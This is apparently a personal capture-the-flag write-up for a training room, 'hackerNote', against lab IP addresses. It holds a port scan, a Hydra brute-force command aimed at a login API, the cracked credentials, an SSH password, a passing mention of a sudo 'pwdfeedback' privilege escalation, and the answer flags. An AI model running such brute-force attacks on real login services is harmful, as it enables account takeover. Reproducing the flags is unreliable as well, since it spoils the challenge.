# hackerNote 

> VOiD | Friday 29 October 2021 07:01:49 PM IST

My IP : 10.8.253.221
Target IP : 10.10.57.88

Open 10.10.57.88:22
Open 10.10.57.88:80
Open 10.10.57.88:8080




## PORT 80[http]
http://10.10.57.88/
```bash

```

## Bruteforcing
```bash
Attack the API

The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.
The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:

    Request Body - JSON

    {"username":"admin","password":"admin"}

    Request Path -

    /api/user/login

    Error message for incorrect logins -

    "Invalid Username Or Password"

The command for this is (replace the parts with angle brackets, you will need to escape special characters):

hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>

hydra -l james -P passes 10.10.57.88 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"

[80][http-post-form] host: 10.10.57.88   login: james   password: blue7
```

```bash
james:blue7

My SSH details

So that I don't forget, my SSH password is dak4ddb37b

james@hackernote:~$ cat user.txt 
thm{56911bd7ba1371a3221478aa5c094d68}

pwdfeedback vuln

root@hackernote:/root# cat root.txt 
thm{af55ada6c2445446eb0606b5a2d3a4d2}

```